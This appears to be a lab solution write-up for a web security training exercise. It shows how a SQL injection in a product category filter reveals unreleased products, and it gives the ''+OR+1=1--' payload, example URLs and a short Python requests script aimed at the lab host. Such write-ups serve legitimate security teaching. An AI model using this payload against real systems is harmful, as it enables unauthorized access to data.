# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data (Apprentice)

**Goal:** Display one or more unreleased products.

**Vulnerable parameter:** `category` in product filter.

## Vulnerability

The application executes:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

No input sanitization.

## Solution

1. Intercept the request that sets the category filter (e.g. `/filter?category=Gifts`).
2. Modify the `category` parameter to:

```
'+OR+1=1--
```

Full URL example:

```
/filter?category=Gifts'+OR+1=1--
```

Or simply:

```
/filter?category='+OR+1=1--
```

3. The resulting query becomes:

```sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
```

This returns all products (including unreleased ones).

## Exploit Payload

```
'+OR+1=1--
```

## Python one-liner (optional)

```python
import requests
url = "https://YOUR-LAB-ID.web-security-academy.net/filter"
params = {"category": "' OR 1=1--"}
r = requests.get(url, params=params)
print(r.text)
```
